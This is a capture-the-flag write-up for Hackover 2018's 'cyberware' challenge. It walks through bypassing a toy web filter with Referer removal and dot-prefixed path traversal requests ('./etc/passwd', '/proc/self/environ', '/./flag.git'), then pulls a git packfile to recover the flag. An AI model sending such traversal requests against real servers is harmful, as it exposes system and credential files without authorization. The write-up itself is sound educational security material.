# cyberware
### Description
```
We have some nice ASCII animals that we want to show you. As we take animal
protection very seriously we have rolled out our WAF beta test of Cyberware
application protector to protect the cuties.

Just carry on, this one is unbreakable.

http://cyberware.ctf.hackover.de:1337

```
### Solution
Solving this task was a real team effort and I am really glad of this cooperation.

The ground was set by [**\_0kami**](https://d0vine.github.io/).
Starting page displays a list of file links.

```
cat.txt
fox.txt
kangaroo.txt
sheep.txt
```

But accessing them does not result in animals being displayed. Instead a `412 HTTP` response is send.

```HTTP
HTTP/1.1 412 referer sucks
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:23:07 GMT
Content-type: text/cyber

Protected by Cyberware 10.1
```
This can be resolved by removing `Referrer` header, thus allowing us to view files ie. `cat.txt`.
```HTTP
HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:21:08 GMT
Content-type: text/cyber
Content-length: 165

<pre>
   ____
  (.   \
    \  |
     \ |___(\--/)
   __/    (  . . )
  "'._.    '-.O.'
       '-.  \ "|\
          '.,,/'.,,
</pre>
```

[**\_0kami**](https://d0vine.github.io/) tried some standard tricks like path traversals:
```HTTP
GET /../../../../etc/passwd HTTP/1.1
```
which returned:
```HTTP
HTTP/1.1 403 Dots are evil
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:26:22 GMT
Content-type: text/cyber

Protected by Cyberware 10.1
```
Then played around with various requests until he tried this:
```HTTP
GET ./etc/passwd HTTP/1.1
```
which worked as expected:
```HTTP
HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:32:57 GMT
Content-type: text/cyber
Content-length: 1285

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
...
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
ctf:x:1000:1000::/home/ctf:
```
I plugged in with some ideas and we played with few not-so-random requests, none of which gave us flag. The only thing we learned was that there is a custom web-server implementation under the hood.
```HTTP
GET ./home/ctf/ HTTP/1.1

HTTP/1.1 403 You shall not list!
```
```HTTP
GET ./home/ctf HTTP/1.1

HTTP/1.1 406 Cyberdir not accaptable
```
Knowing that server runs Linux, I extracted some more useful info:
```HTTP
GET ./proc/self/environ HTTP/1.1

HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:58:03 GMT
Content-type: text/cyber
Content-length: 147

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=7c26257684d8TERM=xtermHOME=/home/ctf
```
and
```HTTP
GET ./proc/self/cmdline HTTP/1.1

HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:58:26 GMT
Content-type: text/cyber
Content-length: 67

/usr/bin/python3./cyberserver.py
```
which let us obtain the server source code:
```HTTP
GET ./home/ctf/cyberserver.py HTTP/1.1
```
```python3
#!/usr/bin/python3
from threading import Thread
from sys import argv
from sys import getsizeof
from time import sleep
from socketserver import ThreadingMixIn
from http.server import SimpleHTTPRequestHandler
from http.server import HTTPServer
from re import search
from os.path import exists
from os.path import isdir

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

class CyberServer(SimpleHTTPRequestHandler):
    def version_string(self):
        return f'Linux/cyber'
    def do_GET(self):
        self.protocol_version = 'HTTP/1.1'
        referer = self.headers.get('Referer')
        path = self.path[1:] or ''
        if referer:
            self.send_response(412, 'referer sucks')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
        if not path:
            self.send_response(200, 'cyber cat')
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            for animal in ['cat', 'fox', 'kangaroo', 'sheep']:
                self.wfile.write("<a href='{0}.txt'>{0}.txt</a></br>"
                                 .format(animal).encode())
            return
        if path.endswith('/'):
            self.send_response(403, 'You shall not list!')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
        if path.startswith('.'):
            self.send_response(403, 'Dots are evil')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
        if path.startswith('flag.git') or search('\\w+/flag.git', path):
            self.send_response(403, 'U NO POWER')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
        if not exists(path):
            self.send_response(404, 'Cyber not found')
            self.send_header('Content-type', 'cyber/error')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
        if isdir(path):
            self.send_response(406, 'Cyberdir not accaptable')
            self.send_header('Content-type', 'cyber/error')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
        try:
            with open(path, 'rb') as f:
                content = f.read()
            self.send_response(200, 'Yippie')
            self.send_header('Content-type', 'text/cyber')
            self.send_header('Content-length', getsizeof(content))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_response(500, 'Cyber alert')
            self.send_header('Content-type', 'cyber/error')
            self.end_headers()
            self.wfile.write("Cyber explosion: {}"
                             .format(path).encode())

class CyberServerThread(Thread):
    server = None
    def __init__(self, host, port):
        Thread.__init__(self)
        self.server = ThreadingSimpleServer((host, port), CyberServer)
    def run(self):
        self.server.serve_forever()
        return

def main(host, port):
    print(f"Starting cyberware at {host}:{port}")
    cyberProtector = CyberServerThread(host, port)
    cyberProtector.server.shutdown
    cyberProtector.daemon = True
    cyberProtector.start()
    while True:
        sleep(1)

if __name__ == "__main__":
    host = "0.0.0.0"
    port = 1337
    if len(argv) >= 2:
        host = argv[1]
    if len(argv) >= 3:
        port = int(argv[3])
    main(host, port)

```
The code clearly shows that there is `flag.git` repository, but it is forbidden from access by regular expression.
I thought briefly about it, pasted the problem on our chat:
> **bezet:**
>
> search('\\\\w+/flag.git', path)
>
and switched to other task. Sometime later [**\_0kami**](https://d0vine.github.io/) poped back and instantly solved it!
> **\_0kami:**
>
> Just as I though, /./ works:
>
```HTTP
GET ./home/ctf/./flag.git/config HTTP/1.1

HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Fri, 05 Oct 2018 22:04:11 GMT
Content-type: text/cyber
Content-length: 192

[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[user]
    name = CyberControlCenter
    email = cybercyber@cyber.center
```

Slightly embarassed by not finding this obvious solution I focused on this task again.
The first approach was trying to copy the repository using `git`.
I set it up to proxy all requests via BurpSuite.
Then added some in-Burp rules.
First one to modify path so that it include dots as `git` was normalizing URL before request.
And another one to change `Content-Type` header, as the server was returning `text/cyber`.
Unfortunately this failed as the server was cheating with response `Content-Length` header as well:

```python3
self.send_header('Content-length', getsizeof(content))
```

I have noticed it previously(as Firefox save dialog was failing with some funny message) when it didn't matter that much as I have been sending all of the request from BurpSuite.
The next step was to manually "touch" each request so that Burp will fix `Content-length` header.
This somehow worked and I was able to start fetching repo, but then cloning failed on request for `http-alternate`.
Anyway one of the files accessed was `objects/info/packs`, which contains list of packed objects stored in this git repository.
```HTTP
GET ./home/ctf/./flag.git/objects/info/packs HTTP/1.1

HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Fri, 05 Oct 2018 22:13:49 GMT
Content-type: text/html
Content-length: 87

P pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack
```
In this case there is only one. It should contain all objects(like commits, trees, files) relevant to this repository.
```HTTP
GET ./home/ctf/./flag.git/objects/pack/pack-1be7d7690af62baab265b9441c4c40c8a26a8ba5.pack HTTP/1.1
```
After downloading it, `file` shows that there is 15 objects inside. Those can be extracted in an empty git repository:
```bash
$ mkdir tmp && cd tmp
$ git init .
$ cat ../pack | git unpack-objects
Unpacking objects: 100% (15/15), done.
```
We end up having partially initialized repository with interesting objects from the remote repository.
```bash
$ find .git/objects/* -type f
.git/objects/13/01f01e7dbd26acd8ca5b09fab05b957e702365
.git/objects/19/d59f1731e3b1ed08536321707a663c21b38400
.git/objects/19/f882c9ad7aec1e682511525cc43e271896ae9e
.git/objects/27/a0f21685cbd435d5376a4a6094f6c8b537e23a
.git/objects/38/db5649511b84ec8f9eb6492dbe43eabe1e6a4a
.git/objects/4b/825dc642cb6eb9a060e54bf8d69288fbee4904
.git/objects/5e/9613e8069eb7a83c1b4554954fb7329490333a
.git/objects/7d/dcca9c9752a2f616f9754dc100fc5e52f8f6df
.git/objects/8c/2f73b4e42a6a1601c0396859aef4ab48da59ac
.git/objects/9e/4f81dd9f577d028441c5227bd25ce9f17fb8ac
.git/objects/ab/1f40973733187f862a972f3f612f3cf9ac6853
.git/objects/b6/9c0fc2567dc2d0e59c6e6a10c7e5afd3013b6a
.git/objects/c0/e01b58327e785a581c32b97e639014aef0f31e
.git/objects/dd/9ebcb882411a06c33ea9d8e4246acf70e7372e
.git/objects/e8/911df8585b67c467809ddc78dac4b916659af7
```
There is a non-porcelain git command `git cat-file`, which will output git object contents given it's hash. As git stores objects in directories which are named with two first letters of hash, we need to concatenate directory and filename to get object hash. A quick oneliner later the flag is revealed.
```
$ find .git/objects/* -type f | sed "s#.*\([0-9abcdef]\{2\}\)/\([0-9abcdef]\+\)#\1\2#" | while read f; do git cat-file -p "$f"; done | grep hackover
100644 blob 8c2f73b4e42a6a1601c0396859aef4ab48da59ac hackover18{Cyb3rw4r3_f0r_Th3_w1N}
100644 blob 8c2f73b4e42a6a1601c0396859aef4ab48da59ac hackover16{Cyb3rw4hr_pl5_n0_taR}
$
```
The funny thing is that there are two flags, one of which seems to be valid for the previous, 2016 edition of Hackover. The grown-up one is the one that submits.

### Flag

**hackover18{Cyb3rw4r3_f0r_Th3_w1N}**
